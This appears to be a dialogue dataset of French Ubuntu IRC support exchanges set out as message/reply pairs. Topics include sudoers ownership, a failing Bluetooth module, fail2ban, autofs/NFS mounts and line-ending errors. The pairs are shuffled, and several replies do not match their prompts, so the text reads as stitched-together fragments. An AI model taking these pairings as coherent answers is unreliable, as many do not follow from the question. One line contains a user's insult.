tu me confirmes avec le compte root ceci je tape ceci dans mon terminal et c'est ok pour moi  >> chown 0440 /etc/sudoers	non, lis la doc de chown, et repasse ici si tu ne comprends pas, je t'ai dit plus haut que 0440 c'est des droits unix, pas un uid, et tu as un probleme d'owner
non, lis la doc de chown, et repasse ici si tu ne comprends pas, je t'ai dit plus haut que 0440 c'est des droits unix, pas un uid, et tu as un probleme d'owner	non la je suis paumé je comprends plus rien ... désolé
tu as un module logiquement plus récent je pense car tu as upgrade	Ahhh c'est pas bête ça...
rfkill list	http://paste.ubuntu.com/13373492/
mh lsmod avant alors	Juste avec "modprobe mt76xx" ?
il y a 90 0e chance que ton module bluetooth soit mort ou moribond, il est considéré comme branché, plante, se reinitialise, se considère comme branché, replante … rince, repeat	La carte en question n'est pas nativement supportée sous Ubuntu. En ubuntu 14.XX j'avais donc manuellement compilé la lib, et ça fonctionnait. Mais depuis ubuntu 15.XX seul la partie wifi fonctionne
La carte en question n'est pas nativement supportée sous Ubuntu. En ubuntu 14.XX j'avais donc manuellement compilé la lib, et ça fonctionnait. Mais depuis ubuntu 15.XX seul la partie wifi fonctionne	ca peut etre ton module qui plante avant que tu puisses faire lsusb et qui force une reinitialisation de la connexion usb
tu connais le nom du module utilisé pour ton périphérique bluetooth tobiasBora ?	Je pense que ça doit être mt76xx
tu connais le nom du module utilisé	Je regarde
et certaines machines utilisent des bus usb internes, c'est tres courant sur les portables pour le BT et/ou le wifi	Hum... Et qui est-ce qui dit que ma carte est débranchée ? Car c'est une carte interne et je me souviens pas avoir manuellement demandé qu'on la débranche...
Hum... Et qui est-ce qui dit que ma carte est débranchée ? Car c'est une carte interne et je me souviens pas avoir manuellement demandé qu'on la débranche...	c'est toi qui le dit: "usb 1.4 :USB disconnect"
c'est toi qui le dit: "usb 1.4 :USB disconnect"	Oui mais je veux dire, comment est-ce que je fais pour re-connecter cette prise BT ? Car elle est intégrée à mon PC portable, donc ou bien elle est branchée et c'est le système qui la débranche (pourquoi ?) ou bien elle n'est physiquement pas branchée, mais là je comprends encore moins car je n'ai jamais fait aucune action pour la débrancher, et ça fonctionnait très bien avant la
Comment se fait-il que je ne la vois pas dans lsusb ? Savez vous comment la faire apparaître ?	euh, il est annoncé comme déconnecté, donc c'est normal qu'il n'apparaisse pas dans lsusb
euh, il est annoncé comme déconnecté, donc c'est normal qu'il n'apparaisse pas dans lsusb	Mais comment dmesg arrive à le voir si il est déconnecté ? Et c'est une carte intégrée à mon ordinateur (MT7630e) et la composante Wifi apparaît dans lspci (et à l'époque la partie Bluetooth apparaissait dans lsusb)
Mais comment dmesg arrive à le voir si il est déconnecté ? Et c'est une carte intégrée à mon ordinateur (MT7630e) et la composante Wifi apparaît dans lspci (et à l'époque la partie Bluetooth apparaissait dans lsusb)	c'est pas monolithique la connexion d'un peripherique, dmesg d'indique qu'une tentative de branchement usb survient et le peripherique usb est considéré comme déconnecté avant que l'initialisation continue
donc un chmod 0440 /etc/suders regle mon probleme ?	non, c'est chown qu'il faut utiliser
pourquoi j'ai ce message : /etc/sudoers is owned by uid 1003, should be 0 et que tout partout quand je regarde c'est pas 0 mais 0440 ?	uid, c'est l'user ID, pas les droits, l'uid 0 est toujours root (par convention), un uid 1003 sous ubuntu, c'est le 3e utilisateur "humain" qui a été créé sur la machine
non peut etre pas comme meme all bien trop dangereux	pas du tout si tu as bien configuré SSH
pastebin s'il te plaît	syn ? ping ?
%admin ALL=(ALL) ALL	j'ai juste ?
12.04 LTS	sudo update-rc.d fail2ban disable
ssh	utilise service, plutôt que /etc/init.d/ :)
la je peut editer le jail de fail2ban pour augmenter le score de louper ?	sudo apt-get install iptables-persistent
firewall c'était mes regles parefeu mais la je ne les trouve pas ....	firewall, c'est donc un bidouillage custom pour faire comme le paquet iptables-persistent en moins bien ? :D
tu me suggere mieu ^^	c'est quoi, firewall ?
sinon j'ai un acces en mode rescue qui pourrais m'aider	ben utilise l'acces en mode rescue pour desactiver fail2ban
Bonjour help plz	en général les gens posent des questions
il n'y a pas des trucs qui foirent, quand on a pas du tout de swap ?	le swap
vire le swap sinon :)	non j'ai que deux gigas de ram :)
c'est à dire ?	c'est à dire que ça se trouve ils ont de bonne raison de faire comme ça
Ah, et je précise que j’ai déjà rtfm ;)	Ddrescue does not write zeros to the output when it finds bad sectors in the input,
je peux limiter 'lutilisation de la swap ? la faire démarrer un peu plus tard ? là ça swappe directement alors qu'il y a encore d ela mémoire libre	swappiness
mais ce serait bête (de ma part) que ddrescue crée un fichier cible prédimensionné car dans ce cas, la taille n’a plus la moindre fiabilité.	http://www.mankier.com/?q=;)
faudra que je fasse la màj vers la 15.10	désolé je vois pas trop d'ou ca peut venir
mais du coup, j'installe il me semble avant la màj que j'avais le pilote 331	c'est peut etre pas un problem nvidia vu que ca fonctionne bien sous Gnome
c'est peut etre pas un problem nvidia vu que ca fonctionne bien sous Gnome	ça n'a rien fait
non toujours pas	essai de modifier ta conf grub comme indiqué dans le post
comme je disais peut-etre la màj du pilote Nvidia	essai : lspci | grep "VGA compatible controller"
[   14.048244] snd_hda_intel 0000:01:00.1: Handle VGA-switcheroo audio client	tu as installé les pilotes proprios Nvidia ?
hum peut-etre la màj du pilote Nvidia	que donne les logs ?
ni accès aux différents bureaux	bonjour
lol	en temps normal, je ne t'aurais pas répondu du tout... mais perso j'y connais rien. ;) Par ailleurs pose ta question précisément.
lea02 regarde la: http://doc.ubuntu-fr.org/gparted :)	je sais redimensionner un disque, je ne comprends juste pas pourquoi cette partition "libre" n'apparait" nulle part via un live usb ou depuis mon système.
tu peut redimensionner le(s) partition avec gparted ou d'autre logiciel de partionement	ce n'est pas ce que je cherche  faire. En gros j'ai sur mon disque une partition non formatée de 50gb, qui n'apparait pas avec Gparted (en live USB)
Bonjour à tous. Un ami me demande de lui intaller Ubuntu sur un Acer iconia W5, j'ai trouvé comment entrer dans le BIOS. Quelqu'un a-t-il un retour d'expérience sur une machine identique ? d'avance merci	quel problème rencontres-tu exactement ?
c'est le site que canonical relaie	il doit y avoir d'autres sites pour la France :)
ça ne serait pas un problème matériel ?	Non, ça s'est reproduit avec un autre clavier branché sur une autre prise
!wiki samba	http://doc.ubuntu-fr.org/samba | http://doc.ubuntu-fr.org/samba_swat | http://doc.ubuntu-fr.org/gsambad | http://doc.ubuntu-fr.org/autofs_avec_samba | http://doc.ubuntu-fr.org/partage
:)	tout est possible :)
vu que c'est un truc lancé par mon .bashrc uniquement	qu'est-ce que c'est ?
je ne sais pas ce qu'est un umask	et sinon pour convertir un fichier texte de dos a unix tu peux utiliser vim, genre ESC:set ff=unix
ok beh  je vais regarder si nano sait forcer le format	c'est ton umask qui definit les permissions lors de la creation d'un nouveau fichier
du genre cp fichiersource fichierdestination ansi	vim (ou un editeurs un minum efficace) ou les outils que je t'ai donné
c'est dans ma ligne /linux quand j'édite grub	"vt.handoff=7 then causes the kernel to maintain the current contents of video memory on virtual terminal 7, which is a new "transparent" VT type."
ouais j'ai remarqué la différence de traitement des retours chariots	sur un windowd une nouvelle ligne c'est \r\n
au mieux nano	sur un unix, un retour a la ligne c'est '\n' (NEw line)
(sans le de)	il se lance auto, ja vais déjà changer ça
je n'utilise pas vim	dans le cas du windows, ce sont les retour chariots qui changent
sans le DE lancé tout va bien	et tes logs ?
et tes logs ?	non
convertir le contenu en ainsi ne change rien	:set ff=msdos et :set ff=unix dans vim
j'ai juste vite ouvert le 'je sais pas quoi qui fait des graphiques' avec ma souris puis ça a freezé	et le tty marche pas ?
oui mais même avec notepad++ la conversion ne change rien	sinon depuis un linux y'a tofrodos et dos2unix comme commande
j'ai fais l'erreur d'éditer sous windows	et des editeurs sous windows qui savent enregistere dans les bon format ;)
car je gère une machine dédié	y'a des outils pour convertir les formats
j'ai un tty	t'as vu comment que ta swap est pleine ?
des fois que ce soit un script chargé par bash...	du coup comment savoir ce qui boufe toute la ram et la swap ?
vide qui va recevoir le contenu	regarde juste le man
oui comme pour javascript	il guele car il voit un \r (qui est char de controle)
ce qui est bien avec bash, c'est que les messages d'erreurs de syntaxe sont aussi parlant que javascript	copie paste ton paste dans un nouveau fihcier
Je ne comprends pas la provenance de cette erreur, si une personne est en mesure de l'identifier, je lui serai reconnaissant de bien vouloir m'aider s'il vous plaît	genre fichier editer sour windows ET unix
Et voici l'erreur qui m'est retournée : http://puu.sh/lpUD4/f865e4dade.png	et vuq ue ca marche quand je copie colle, c'est un char a  la con
y'a la commande source sinon	je peux pas ouvrir de terminal
je rédémarre	c'est aussi cohérent ;)
j'ai peut-être fait une connerie dans mon .bashrc	reinstalle, ou rachete toi une nouvelle machine
ah bin voilà, la swap est remplie, je peux plus rien faire :)	pour un ./bashrc ?
terminator aussi	et avec init=/bin/bash ?
et avec init=/bin/bash ?	oui je peux essayer ça aussi
oui je peux essayer ça aussi	/bin/sh alors :)
ça permet parfois d'atteindre au moins un TTY	en fait ça plante dès que j'ouvre un term :)
bonjour	pas très discret
je dois reconfigurer un truc ?	si c'est ta GUI qui bloque au boot, essaie avec un nomodeset dans les paramètres de kernel (si pas déjà tenté)
Imust sqy I am q linux beginner	I don't know zorin
Hi There I run Zorin on the top of UBUNTU but I do not know how to lounch GPARTED	here we speak french, if you prefer speak english please join #ubuntu
Ethernet: 10ec:8168 ** Uptime: 55m 50s **	et donc ?
merci de ne pas répondre...	peut être que personne n'est disponible, ou que personne n'a la réponse
y'a t'il une personne qui c'est comment eviter la deconnection du wifi ?	ça dépend de pas mal de paramètres, il n'y a pas une méthode magique pour ça
il y a eu des modification hardware ? (branchement ou débranchement de disque)	visiblement ça c'est passé pendant l'upgrade de windows 8 à 10
J'ai un pc devant moi avec grub qui a des soucis...il passe en rescue avec le msg : "unknown filesystem"	tu as la possibilité de booter sur un système live ?
bonsoir a tous	Bonsoir
je sais pas comment savoir si mon périphérique est reconnu par ubuntu server	 tu enleves ta clé, tu l as rebranche et tu lis les dernieres lignes de la commande dmesg
via un live cd ? en chrootant puis purger avec apt il devrait pouvoir	je ne sais plus comment démarrer sur une clé usb sur sa machine (à une install party Morphee avait passé vingt minutes pour trouver comment).
si c'est une instalaytion par defaut n'y a t il pas baobab pour voir quel repertoire prend beaucoup de place?	peut pas virer dans le /home, il ne reste que les fichiers système.
Une seule	tu es sur qu'il existe aucun fichier inutile dans le home (dans téléchargement par exemple ?
les anciens noyaux et leur header	essayé, c'est le serpent qui se mord la queue.
Le logiciel qui effectue le rip parviens bien à lire le contenu. J'ajoute que faire une copie déchiffrée est possible avec d'autres systèmes d'exploitation (j'étais sur Mac avant).	https://help.ubuntu.com/community/RestrictedFormats/BluRayAndHDDVD
je propose le support payant de Canonical .. ça ira sans doute plus vite	Surtout le vendredi soir en plein attentat... TheCheshireCat
Surtout le vendredi soir en plein attentat... TheCheshireCat	je confirme … on est vendredi
o_O	oui
niko : tu es carrément à la masse	j'ai été agréable avec toi depuis ton arrivée, tu sembles un peu sur les nerfs parce que ça marche pas comme tu veux, s'il te plait fait l'effort d'être au moins neutre dans ton interaction avec les autres
non mais	efficiency
bê bien sûr autofs voilà pourquoi depuis lors je te parle d'autofs	soit respectueux s'il te plait
bug : les home de tous les users sont montés en permanence dès le démarrage système de la machine ce qui n'est pas normal , voilà voilà le bug	le type indiqué en face de ces "points de montage" est-il autofs ?
le bug c'est qu'ils restent monté même étant inactifs sur la machine cliente nfs	les montages que tu observes et qui te dérangent sont-ils de type autofs ?
ben alors !! tu as compris maintenant	tu veux dire après le timeout ?
Marmotte : The automount daemons automatically mount filesystems when they are used and unmount them after a period of inactivity	il ne faut pas lire plus que ce qui est écrit. ce qui te gène, c'est qu'autofs utilise des points de montage virtuels, c'est bien ça ?
piti et Marmotte : avez vous fait fait apt-cache show autofs . merci de faire cette commande pour comprendre mon problème !!!	je ne vois pas en quoi il est indiqué que les points de montages non accessibles par un utilisateur sont rendus invisibles
justement je ne voudrais pas que le X ait la liste des utilisateurs existants voilà la raison de l'existence de autofs.  "mount" me donne la liste de mes 500 users	tu peux me paster cette liste (en privé si tu veux pas exposer les users) ?
allez oublie 7XX, réfléchis plutôt ici "faire la différence entre le montage manuelle des homes des users et le montage automatique autofs (http://doc.ubuntu-fr.org/autofs ) des homes "	aussi, peux-tu faire un paste de la sortie de mount ? (ou de /proc/mounts)
par contre si X fait "cd /usr/Y" cela marche si Y fait "cd /usr/X" cela marche avec les droits 7XX sur les homes des users. Mais vous n'avez pas encore compris mon problème. Il faudrait la différence entre le montage manuelle des homes des users et le montage automatique (autofshttp://doc.ubuntu-fr.org/autofs ) des homes	si ton problème est que X peut accéder aux données de Y, tu donnes l'impression que c'est plutôt un problème de droits que de conf autofs/nfs (homes en g+rx avec un groupe commun, voire en o+rx)
 Si l'autofs fonctionne correctement le dossier du point de montage doit rester vide jusqu'à ce que un user ouvre une session sinon ce n'est plus de l'autofs	ce que j'ai ici, c'est: un dossier /user, accessible (et donc montable) par tout le monde, qui est ainsi monté lorsqu'un utilisateur y accède
cela nous permettra d'être sur la même longueur d'onde	ce qu'attend piti, c'est ce que tu as fait, ce que tu t'attends à obtenir, et ce que tu obtiens
je fais du nfs v4 . Je crois qu'il y a un bug ou bien nous ne sommes pas compris. Si l'autofs fonctionne correctement le dossier du point doit rester vide jusqu'à ce que un user ouvre une session sinon ce n'est plus de l'autofs	ce qui est important, c'est que l'utilisateur X n'ait pas le droit de monter dans le dossier de l'utilisateur Y
pfff ! désolé tu ne connais pas la chose merci	aussi, il manque un peu d'informations: c'est du nfsv3 ? nfsv4 ?
les dossiers ont besoin d'être là. La question, c'est est-ce que depuis un utilisateur, tu peux monter dans celui d'un autre ?	pfff ! ça troll un vendredi
et donc là ! dans le dossier du point de montage il y a tous les dossiers qui sont déjà présents ce qui n'est pas normal !!!	j'ai ici 320 $HOME servis par nfs, et on utilise autofs
c'est un usage assez standard oui	je voudrais qu'un user lambda aille fouille chez autre. C'est bizarre c'est comme l'automontage ne fonctionnait pas
je voudrais qu'un user lambda aille fouille chez autre. C'est bizarre c'est comme l'automontage ne fonctionnait pas	ah, aussi, les home sont pas en 700 ?
Bonjour , j'ai un problème avec le autofs, je voudrais qu'il monte un seul user de ma machine client nfs  malheureusement il me monte tous les users. J'ai dans le /etc/default/autofs BROWSE_MODE="no" ce ne marche pas que dois je faire ? merci d'avance	tu peux expliciter un peu plus ?
tu peux expliciter un peu plus ?	en fait avec l'automontage de autofs le montage nfs sur la machine cliente se fait automatiquement à chaque fois qu'un user ouvre une session. De ce fait sur le point de montage il n'y a pas de home directorie déjà monté
en fait avec l'automontage de autofs le montage nfs sur la machine cliente se fait automatiquement à chaque fois qu'un user ouvre une session. De ce fait sur le point de montage il n'y a pas de home directorie déjà monté	quand tu lances mount sur une station, tu vois tous qui est monté ?
sinon en ligne de commande ca donne : shutdown -10:00 heure ?	man shutdown
Mais la je teste la solution a 26 points de stack	sinon j'ai trouver ça : http://unix.stackexchange.com/questions/83986/tell-ssh-to-use-a-graphical-prompt-for-key-passphrase
mais certains scripts de déploiement n'aime pas les mots de passe, et ne fonctionnent qu'avec des certifs	mais j'ai du mal à cerner ton problème ...
a chaque session?	mais du coup tu peux comme même accéder à la session ?
mais du coup tu peux comme même accéder à la session ?	oui
oui	sinon il y a le paquet : openssh-askpass
la troisieme réponse	 non la passpharase que j'ai mise quand j'ai créé la pair
ça parle a quelqu'un ce bug?	essayes ça https://superuser.com/questions/52562/ssh-keychain-for-xfce
Bonjour, je ne peux pas démarrer Ubuntu 15.04 avec le dernier kernel  3.19.0-33-generic (kernel panic mount VFS) mais tout fonctionne bien en 3.19.0-32-generic. Avez-vous une idée ? Merci	essaie de reconstruire l'initrd, au cas où il se soit mal généré...
essaie de reconstruire l'initrd, au cas où il se soit mal généré...	pas bête j'essai
tu as regarder dans /boot ?	J'ai apparament plusieurs fichiers avec des versions de noyau
http://dl.mesnotices.fr/new/external_light.php?id=1276653&RDM=62688&brand=ORION&ref=TV32RN10D&real_ref=TV32RN10D&real_ref_top=TV32RN10D&langueM=F&key=61e25b5e05540395c8b50c525699a089&security=44f27e07fe7d4b4cd1b94048feab6acc&host=mesnotices.20minutes.fr&errorURL=http%3A0.0000000.000000mesnotices.20minutes.fr0.000000014159.php0.000000ID  01276653%26k  0f3d91121ae9c82743e86d9ee273e177e                         %3DORION%2520TV32RN10D&n1=3289&n2=4039&res=4967&modeSC=M&direct=1	merci pour ton aide
Bonjour, j'ai un problème de résolution d'écran, l'image dépasse à la verticale comme à l'horizontale de mon écran et je n'arrive pas créer une nouvelle résolution avec xrandr, quelqu'un peut m'aider?	tu as pas un réglage sur ton écran ?
tu as pas un réglage sur ton écran ?	non c'est en HDMI il y'a des réglages uniquement pour le VGA
j'arrive pas	je te parles en preivé la ...
c tjr pareil qd je tape paste http://paste.ubuntu.com/13226128/	lie tes message privés
je suis nouveau sur linux	lance un terminal de commande
vous recommanderiez quoi pour deployer en multicast ?	c'est a dire ?
oui	tu pourrais faire un pastebin de la trace d'erreur complete ? ou screenshot
oui	et sinon t'arrive a lancer ta VM ?
tu choisi ton iso et c'est bon normalement	je vais graver l'image iso tantpis
je vais graver l'image iso tantpis	quel message d'erreur ?
quel message d'erreur ?	VBOX_E_OBJECT_NOT_FOUND (0x80BB0001)
VBOX_E_OBJECT_NOT_FOUND (0x80BB0001)	des fois il faut ajouter un device
VBOX_E_IPRT_ERROR (0x80BB0005)	tu vas dans la partie storage de la conf de ta vm
quelqu'un peut m'aider sil vous plait	quel logiciel de virtualisation ?
quel logiciel de virtualisation ?	oracle vm virtualbox
crossposter des sondages... de mieux en mieux :/	certainement un agent du FBI :p
je veux configurer proftpd avec les protocole FTPes et SFTP .	le fait d'envoyer le même message dans différents canaux de support
arf … c'est un crosspost … faut m'oublier vite alors :/	c'est quoi un crosspost?.
Avelldiroll ça ne repond pas a ma question.	ah mais tu fais ce que tu veux, hein, je donne juste mon opinion, si elle ne te plait pas, libre à toi de l'ignorer
error using DisplayLogin 'welcome.msg': Aucun fichier ou dossier de ce type	je pense pas que ça soit lié
ah oui ? Wow ma mise à niveau va être longue ...	mouarf
le paquet qui contient la commande que tu essayait de faire n'est plus fournis par défaut avec ubuntu	les paquets de projets web s'installent d'une maniere assez specifique sous ubuntu, c'est herité de debian, pour comprendre le pourquoi-du-comment, il faut aller lire la debian-policy, pour voir où s'est installé wordpress : dpkg -L wordpress
je vgais copier le script tu va comprendre (un peu sale avec les grep mais fonctionnel)	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
pour récupérer la commande lancée	tu cherches à faire quoi exactement ?
ok c'ets bon j'ai réussi avec un programme avec while, sleep, ps et grep	pas très clair ta demande
j'ai telecgargé à partir d'cici l'iso	depuis là : http://releases.ubuntu.com/wily/  ?
je comprends pas quelquun peut m'aider	évite le cross-posting, ça attire plus les ignores que les réponses...
évite le cross-posting, ça attire plus les ignores que les réponses...	j'ai fait un dpkg-reconfigure et maintenant ca fonctionne :)
il n'y à aucun archivage préalable en tar	donc gunzip
mezen > http://doc.ubuntu-fr.org/modem_rtc_smartlink	et ?
bonsoir	tu peux, c'est ton pc après tout
j'ai un pilote inconnu dans la page des pilotes additionnels comment je pourrait faire pour mettre un vrai pilote	le pilote inconnu est probablement pour le processeur, perso je ne l'utilise pas
pour etre plus precis	sous Firefox Win8.1 ni chrome Win8.1 non plus
oui toujours la bonjour Ubik_	je suis novice en linux mais ctrl+f1 devrait sortir de xwin et ctrl+f7 revient dans x, maintenant le ne sais pas si x fonctionne en arriere plan
Merci quand meme McPeter	ben de rein :(
e*message	?
:p	si tu veux causer aux devs, faut aller sur le salon du projet, pas sur un salon de support pour une distro
soit le support des lecteur zip usb ont été degagé du noyau	ah oui .. pas pensé à ça
nop ca change rien pourtant sur mon laptop il est alimenté	faut de la "patate" en 5v
je vais tester avec la prise de la mouse	tu n'aurais pas un hub usb alimenté ?
je vait trouver un autre cable pour try	?
je peut le lire sur mon fixe	le cfdisk cause ?
copies/colles le retour sur le paste	j ai aucun retour avec le fdisk meme quan je precise le sdb
j ai qu in hdd sur mon laptop et les zip cest tjrs la 4eme partition	si tu fais un : sudo fdisk -l   (c'est "moins elle" pas "moins un")
a qui doit je m adresser ?	tu fais quoi pour monter ton zip ?
ah tiens, oui	c'est une petite astuce ;o)
tu ma dit sa : je veux dire tu garde l'appui sur ctrl puis alt (sans lâcher ctrl) puis sur f2 sans lâcher les deux précédentes puis tu lache tout ?	oui j'ai dit ça … (mais jamais dit alt+ctrl+f2 ..)
si tout les nouveau utilisateur de linux vous les recever comme sa autant dire que beaver que j'ai peut etre un handicap  si tu le dit tu devrai pas juger les gens avant de connaitre mais tes un gros con sinom .....	quand on demande de l'aide à quelqu'un on écoute ce qu'il dit et on tente d'éxécuter ce qu'il te demande … on fait pas n'importe quoi dans son coin sans tenir compte de ce que te demande celui qui veut bénévolement bien t'aider
oO( lol )	il a peut être un handicap, ou il est peut être trop jeune, genre 13 ans
non pas de clé	comprenons nous bien ... à quel moment tu dois sélectionner un disque ?!
ok	MAIS STOP LÀ ....
j'ai 4 choix	heu ....
j'arrive plus à suivre moi	:)
ok	désolé, je ne savais pas.
traduction stp	as tu un accés ssh?
bonjours j'ai toujours le meme probleme avec acpi	qui est?
comment ça pardon ?	rien compris à ton probléme!
[Desktop Entry] Version=1 Name=lanceurOC Comment=This is my comment Exec=/home/m/Bureau/OpenConcerto.sh Icon=/home/m/Bureau/icon.png Terminal=false Type=Application Categories=Utility;Application;	pardon?
tar -zxvf <tar filename> <file you want to extract>	comment je fais pour extraire un directory ?
vi	ok, je n'avais pas suivi les évolutions de versions, désolé, j'ai juste installé une fois pour me rendre compte que ce n'était pas à ma portée ^^
heuuu ... je dirais heuuu ... faut tester tu verras bien ^_^	c'est quoi e20 ? Enlightment ?
ou sinon c'ets un autre répertoire, mais en tout cas wget ne les trouve pas	as tu installé opensll ?
don't understand	this is a french channel
Bonjour à tous ! Aujourd'hui petite prise de tête avec mysql sur mon ubuntu server... j'essaye de faire un update de plusieurs champs dans une base, et je dois avoir une erreur de syntaxe quelque part... mais je la trouve pas. http://pastebin.com/ad6DNTNX	problème de guillemet
parce que l(L)inux ne se prend pas pour dieu ?	parce que vendredi, et même les autres jours je ne suis pas le tapoteur de clavier le plus delicat ou correct
20 Go de RAM, j'aurais un PC de 2075 et je viendrais du futur :P	sur ce pc j'ai 24 Go :)
(en espérant que LTS aille de pair avec une rapidité et des bugs nettement plus difficiles à trouver qu'en 1h de test. Mais je ne sais pas dans quelle mesure Virtualbox offre ou non une expérience réaliste de ce que ça pourrait être en "non-émulation")	20 Go de ram ? oO
et sa frequence	lspcu
Le system requirements s'est 5GB de libre pour une installation desktop. Combien vous conseillez de mettre pour une utilisation "bureautique"?	au moins 20G, mais bon ça depend beaucoup de la taille et du nombre de tes fichiers
au moins 20G, mais bon ça depend beaucoup de la taille et du nombre de tes fichiers	Bah je vais faire une partition home pour mes fichiers. Je pensais mettre 20G comme pour xubuntu. Merci : )
debian !!! ah ....qu'est ce que je n'ai pas essayé en version je suis déja passé du linux mint à manjaro ,.....	donc c'est pas debian ^^
il n y a pas de bidouillage possible pour juste faire fonctionner la clé?	regarde du côté de https://help.ubuntu.com/community/UbuntuBackports
vamps>  la premiere ligne de commande je l'ai déja fait  du coup je suis tout de suite paéss à la suivante   http://paste.ubuntu-fr-secours.org/src-148153	a vue de nez je dirais que ton noyau est incompatible avec le driver
je bloque au niveau de la commande " make" il y a pas mal d'erreurs	qu'est-ce qui ne marche pas exactement ?
vamps> j'ai essayé ce tuto, qui ressemble à celui que tu m'as donné  en lien , et ça ne marche pas   http://paste.ubuntu-fr-secours.org/src-148152	effectivement je viens de vérifier la 12.04 est supporté jusqu'en 2017
vamps j'ai quand même un bureau qui me plait bien , et c'est vraiment vraiment tres fluide, très agréable	tu peux avoir exactement la même chose sur une version récente
vamps> oui; tu penses que c'est impossible de l'installer sur la version que j'ai actuellement?	non, essayes de suivre le premier lien que je t'ai donné ça marchera peut-être
parce que j'avais un souci avec 15.04 et ça ramait un peu, j'ai un ordi pas très puissant , et du coup je me suis résolue à passer sur une version ancienne	c'est pas une bonne idée, tu peux utiliser un bureau moins gourmand sur la version 15.04
vamps > j'avais auparavant la version 15.04 ( vivid vervet) et ça à marcher. j'ai utilisé ce tutoriel ....( !paste)	pourquoi tu es passé sur une version bien inférieur alors ?
vamps >oui c'est celle là	je vois ça https://askubuntu.com/questions/674116/how-to-install-tp-link-t2uh-wireless-adapter-driver-ralink-mt7610u
j'ai comme clé TP Link AC600 archer ( T2U) et comme système , j'ai la version ancienne xubuntu 12.04	tu peux brancher ta clef et poster le résultat de la de commande "lsusb" sur http://pastebin.ubuntu.com/ ?
???	c'est à dire ?
tu as essayé différente résolution ?	ça non, à tester. merci
sinon bah... achête un SSD et comme ça il aura même plus le temps d'afficher le splash screen :s	lol
oui, je veut dire que j'ai appliqué les fix corrant: http://doc.ubuntu-fr.org/plymouth#l_affichage_de_plymouth_est_degrade_suite_a_l_installation_du_pilote_privateur_nvidia	vérifie une deuxieme fois
vérifie une deuxieme fois	merci quand même, ça ne bave plus mais le backgroud disparait.
il n'y a pas foule! :)	avec le pilote proprio nvidia tu peux pas activer le framebuffer
monde*	réussi quoi ça ?
incluent, sont incluses dans, je ne sais pas quel vocabulaire utiliser pour parler correctement	https://community.kde.org/Distributions
(pardon pour cette cascade de questions :P)	une tempête de personnalité, Riddell est le responsable de Kubuntu depuis le début, il est remplacé, fin de l'histoire sur la partie technique :)
mais niveau software, il y a toujours moyen de substituer les logiciels natifs pour en privilégier d'autres, non?	tout à fait
Bonjour. Je suis à deux doigts de quitter windows pour linux. Je souhaiterais un environnement kde et je pense utiliser kubuntu, si possible avec plasma 5.  J'ai lu que pas mal de monde avait eu des soucis avec la v.15.04 de Kubuntu, est-ce que  c'est toujours le cas sous la version 15.10 ?	il y a toujours des soucis remontés pour chacune des versions, comme tous les OS
sudo apt-get install git build-essential /  git clone .............../make /  sudo make install /  ....	Tu penses pouvoir y arriver ? ou tu ne comprends pas ce qu'est une ligne de commande ?
!wiki ndiswrapper	http://doc.ubuntu-fr.org/ndiswrapper | http://doc.ubuntu-fr.org/ndisgtk | http://doc.ubuntu-fr.org/bcm4328 | http://doc.ubuntu-fr.org/wifi_realtek_rtl8187 | http://doc.ubuntu-fr.org/wifi
ou alors pas	tu es lisible, mais je n'ai aucune idée de ce qu'est emmabuntu, probablement plus simple de les contacter pour du support, ils sauront quelles modifications ils apportent à ubuntu
désolé ^^	le crossposting, c'est pas une bonne idée, ca fait perdre du temps à tout le monde, bonne soirée
Bonsoir tous le monde, voilà je suis débutant sous Linux et j'ai un gros souçis que je n'avais pas avec Windows, à savoir que mes port USB arrière (Ceux de la carte mère) ne sont pas alimenté quand je démarre sous linux	tu es sûr que tes ports USB ont un probleme d'alimentation, où est ce que ca pourrait etre ton controlleur usb qui n'est pas reconnu ?
pourquoi	parce qu' uBOTu-fr est un bot qui repond automatiquement à cette question (qui n'a pas une grande utilité sur irc, si on une question, autant la poser directement, si quelqu'un repond, c'est qu'il y a du mone …)
rha, bon je vais virer ce split sur Irssi	je me suis fait avoir tellement de fois à cause de ce truc, j'ai finit par le virer aussi
mais ce soir je serai avec mon ordi	bon à ce que je lis T2U c'est une clef à problème
si quelqu'un pouvait m aider	résultat de la commande: lsusb
j'ai installer ubuntu hier soir sur un w7 qui merdait grave j'ai supprimer une partition noire (selon le code couleur de gpart) hier soir que je n'aurait peut etre pas du	normalement ubuntu devrait pas être perturbé par la perte d'une partition lié au windows
oh je comprend le bot du coup :p	df
quelqu'un sait ou je devrait aller voir?	essaye de supprimer le cache : rm -r ~/.cache/software-center/
philippe@philippe-XPS13-9333:~$ :/etc/apt/souces.list.d/remmina-ppa-team-next-precise.list bash: :/etc/apt/souces.list.d/remmina-ppa-team-next-precise.list: Aucun fichier ou dossier de ce type philippe@philippe-XPS13-9333:~$	pour afficher le contenu d'un fichier, c'est la commande cat pas :
est ce bon là ?	donne nous le lien du copier coller, le bot n'a pas l'air de vouloir le fair e à ta place:D
philippe@philippe-XPS13-9333:~$ ls /etc/apt/sources.list.d/ dell-sputnik-archive.list       precise-dell.list.save dell-sputnik-archive.list.save  precise-oem-sp1.list google-chrome.list              precise-oem-sp1.list.save google-chrome.list.save         remmina-ppa-team-remmina-next-precise.list precise-dell.list philippe@philippe-XPS13-9333:~$	dans paste, comme tout à l'heure...
si, je viens de le refaire, j'ai refait copier coller	tu peux me redonner le copier/coller ?
tu parles de la mise a joru de quoi en fait ?	conseiller le -y à quelqu'un qui a déjà du mal à taper une commande ls sans erreur... c'est pas suicidaire ? :)
nom du fichier "update-manager	tu n'as toujours pas réussi à taper la commande que je t'avais donnée sans erreur
je fais quoi maintenat	http://pastebin.com/
philippe@philippe-XPS13-9333:~$ ls -l /etc/apt/ total 64 drwxr-xr-x 2 root root  4096 oct.  26 16:00 apt.conf.d drwxr-xr-x 2 root root  4096 avril 20  2012 preferences.d -rw-r--r-- 1 root root  3323 mars  24  2015 sources.list -rw-r--r-- 1 root root     0 mai   15  2014 sources.list~ drwxr-xr-x 2 root root  4096 mars  24  2015 sources.list.d -rw-r--r-- 1 root root  3323 mars  24  2015 sources.list.save -rw------- 1 root root  1200 fÃ	ca y est, mais utilise plutot un truc comme pastebin
voyez vous mon copier coller	heu, non je l'ai pas la
ligne 48 a 51 dans copie coller	verifie les droits
Re, je n'arrive pas à solutionner ma mise a jour	c'est quoi ton probl`eme en fait ?
merci pour ton avis	bah de rien, c'est pas vraiment une solution, mais c'est inquietant de ne pas savoir ou passent les mails... je jouerai pas ma vie dessus, mais franchement je parierai bien sur une base locale pour ameliorer l'indexation etc... avec un nom bien tordu et pas du tout equivoque
